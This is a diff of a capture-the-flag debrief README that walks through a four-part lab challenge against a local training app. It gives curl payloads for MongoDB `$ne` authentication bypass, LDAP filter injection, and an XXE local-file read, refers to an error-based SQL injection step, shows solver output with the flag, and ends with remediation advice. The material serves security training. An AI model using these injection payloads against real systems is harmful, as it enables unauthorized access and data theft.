@@ -1,4 +1,4 @@
-# Chairman Election Infiltration — Debrief
+# Chairman Election Infiltration, Debrief
 
 **Node:** `f2` &middot; **Flag:** `SEIYAKU{chairman_of_the_loopholes}` &middot; **Routes:** four faction routes + `POST /f/omnigrid/seize` &middot; **Sink:** `challenges/finals.py`, all four real backend engines used across this arc &middot; **Signal:** the Chairman seat's real key, fetched from MariaDB only once all four faction fragments independently verify
 
@@ -8,7 +8,7 @@ This is the arc's closing statement: four completely independent
 systems, four completely independent bug classes, and no narrative
 pointing you at which technique any one of them wants. Each faction
 route below is deliberately built from the exact same sink shape as a
-floor you've already solved earlier in the arc — the lesson isn't a new
+floor you've already solved earlier in the arc, the lesson isn't a new
 vulnerability, it's recognizing a familiar shape on unfamiliar ground.
 
 ```python
@@ -27,15 +27,15 @@ def f2_seize():
 
 Every one of the four `_true_*_fragment()` helpers re-derives that
 faction's real, current value with a **safe, non-injectable** lookup of
-its own — a parameterized SQL query, a fully-specified `find_one()`, a
+its own, a parameterized SQL query, a fully-specified `find_one()`, a
 fixed-DN LDAP search, a direct file read. None of them ever build a
 query from the caller-submitted fragment strings. There is no shortcut
 past this check: a caller can't inject their way into `/seize` itself,
-because nothing about `/seize`'s own logic is vulnerable — the only way
+because nothing about `/seize`'s own logic is vulnerable, the only way
 to make all four `matches` entries `True` is to have genuinely extracted
 all four real fragments from their real, native systems first.
 
-## Faction 1 — Onboarding (MariaDB, error-based SQLi)
+## Faction 1, Onboarding (MariaDB, error-based SQLi)
 
 Identical bug and sink shape to Netero's Recipe Vault (p1_2) and F.1's
 stage 1:
@@ -60,7 +60,7 @@ curl -s -G "$BASE/f/omnigrid/onboarding" \
 Recovers `CHAIR-0NB0ARD-7f2a` in the rendered exception text, exactly
 like every earlier error-based floor in this arc.
 
-## Faction 2 — Mobile API (MongoDB, `$ne` auth bypass)
+## Faction 2, Mobile API (MongoDB, `$ne` auth bypass)
 
 Identical bug and sink shape to the Archive Guardian (p4_2):
 
@@ -70,7 +70,7 @@ agent = db.omnigrid_agents.find_one(query)
 ```
 
 Payload (bracket-notation form fields, same dual-channel support as
-p4_2 — a JSON body with `{"$ne": null}` works identically):
+p4_2, a JSON body with `{"$ne": null}` works identically):
 
 ```bash
 curl -s -X POST "$BASE/f/omnigrid/mobile" -H "Accept: application/json" \
@@ -78,10 +78,10 @@ curl -s -X POST "$BASE/f/omnigrid/mobile" -H "Accept: application/json" \
 ```
 
 Recovers `CHAIR-M0B1LE-c91d` from the one seeded `omnigrid_agents`
-document — the exact same "reach MongoDB with an operator object instead
+document, the exact same "reach MongoDB with an operator object instead
 of a string" bug as every earlier NoSQL floor.
 
-## Faction 3 — Directory (OpenLDAP, filter-injection dump)
+## Faction 3, Directory (OpenLDAP, filter-injection dump)
 
 Identical bug and sink shape to the Zodiac Breach (p4_3):
 
@@ -97,10 +97,10 @@ curl -s -G "$BASE/f/omnigrid/directory" --data-urlencode 'uid=*)(objectClass=*'
 
 Widens the filter past what any well-formed single-uid lookup could
 match, dumping the whole `ou=omnigrid` roster and recovering
-`CHAIR-D1R3CT0RY-4e6b` from `uid=directory-svc`'s `description` — a
+`CHAIR-D1R3CT0RY-4e6b` from `uid=directory-svc`'s `description`, a
 field never shown for a clean, non-injected, single-entry match.
 
-## Faction 4 — Document Import (XXE file read)
+## Faction 4, Document Import (XXE file read)
 
 Identical bug and sink shape to the King's Sealed Archives (p5_3): the
 exact same `core.xml_parser.parse()` call, `resolve_entities=True` and
@@ -114,7 +114,7 @@ curl -s -X POST "$BASE/f/omnigrid/import" \
     --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///opt/omnigrid/fragment.txt">]><request><document>&xxe;</document></request>'
 ```
 
-Recovers `CHAIR-D0CX7Q-9a3f`, read from `/opt/omnigrid/fragment.txt` — a
+Recovers `CHAIR-D0CX7Q-9a3f`, read from `/opt/omnigrid/fragment.txt`, a
 file sealed outside the app's own source tree, added by the
 `Dockerfile`, never served by any other route.
 
@@ -133,7 +133,7 @@ curl -s -X POST "$BASE/f/omnigrid/seize" -H "Accept: application/json" \
 ```
 
 A partial submission (one wrong fragment, three correct) is rejected
-outright, with no partial credit and no flag — proving `/seize` isn't
+outright, with no partial credit and no flag, proving `/seize` isn't
 just checking that *a* value was supplied per field, but that every
 single one genuinely matches its faction's real current data:
 
@@ -159,17 +159,17 @@ this run):
 
 ```
 [f2] target: http://localhost:8000/f/omnigrid
-[f2] faction 1 — Onboarding (MariaDB, error-based SQLi)
+[f2] faction 1, Onboarding (MariaDB, error-based SQLi)
   ok: fragment = 'CHAIR-0NB0ARD-7f2a'
-[f2] faction 2 — Mobile API (MongoDB, $ne auth bypass)
+[f2] faction 2, Mobile API (MongoDB, $ne auth bypass)
   ok: fragment = 'CHAIR-M0B1LE-c91d'
-[f2] faction 3 — Directory (OpenLDAP, filter-injection dump)
+[f2] faction 3, Directory (OpenLDAP, filter-injection dump)
   ok: fragment = 'CHAIR-D1R3CT0RY-4e6b'
-[f2] faction 4 — Document Import (XXE file read)
+[f2] faction 4, Document Import (XXE file read)
   ok: fragment = 'CHAIR-D0CX7Q-9a3f'
 [f2] seizing the Chairman seat with all four fragments
   response: {'flag': 'SEIYAKU{chairman_of_the_loopholes}', 'matches': {'directory': True, 'document': True, 'mobile': True, 'onboarding': True}, 'success': True}
-  ok: Chairman seat seized — flag recovered: SEIYAKU{chairman_of_the_loopholes}
+  ok: Chairman seat seized, flag recovered: SEIYAKU{chairman_of_the_loopholes}
 [f2] PASS
 ```
 
@@ -179,12 +179,12 @@ Every faction in OmniGrid did roughly what a real, siloed organization
 actually does: secured its own system to whatever standard its own team
 thought was reasonable, and assumed the other departments' problems
 weren't its concern. None of the four bugs here required breaking any
-new ground technically — each one is a bug this arc already taught,
+new ground technically, each one is a bug this arc already taught,
 solved once already. What the Chairman's seat actually tested wasn't
 depth in any one technique. It was whether you could walk into an
 unfamiliar system with no guide pointing at "this is a boolean-blind
 floor" or "this is the LDAP one," recognize the shape of the rule being
-enforced, and find precisely where that rule was worded imprecisely —
+enforced, and find precisely where that rule was worded imprecisely,
 four separate times, in four separate grammars, with nothing in common
 between the four factions except that every single one of them made the
 same category of mistake, independently, without realizing any of the
@@ -193,19 +193,19 @@ others had too.
 ## Remediation
 
 Every individual faction's fix is identical to its earlier counterpart
-in this arc — see Phase 1 (`phase1/README.md`), Phase 4
+in this arc, see Phase 1 (`phase1/README.md`), Phase 4
 (`phase4/README.md`), and Phase 5 (`phase5/README.md`) for the complete
 per-technique remediation writeups. The lesson specific to this final, worth stating plainly for a
 real organization: **"we secured system X"
 is not the same claim as "we are secure."** Four departments each doing
 reasonably competent security work on their own system, in isolation,
 with no shared standard and no cross-team review, still adds up to four
-independent ways in — an attacker only has to find the weakest one, not
+independent ways in, an attacker only has to find the weakest one, not
 defeat all four at once. A real security program needs:
 
-- **A shared, organization-wide secure-coding standard** — parameterized
+- **A shared, organization-wide secure-coding standard**, parameterized
   queries, input type-validation, escaped filter construction, and a
-  hardened XML parser configuration — applied consistently across every
+  hardened XML parser configuration, applied consistently across every
   team and every backend, not independently reinvented (or not) by each
   department.
 - **Centralized security review**, so a pattern already flagged as
@@ -215,6 +215,6 @@ defeat all four at once. A real security program needs:
   backend.
 - **Least-privilege boundaries between departments' systems**, so a
   breach in one faction's stack doesn't automatically compromise the
-  shared resource (here, the Chairman seat) that all four converge on —
+  shared resource (here, the Chairman seat) that all four converge on,
   segmentation limits exactly this kind of "four independently-secured
   systems, one combined point of failure" outcome.
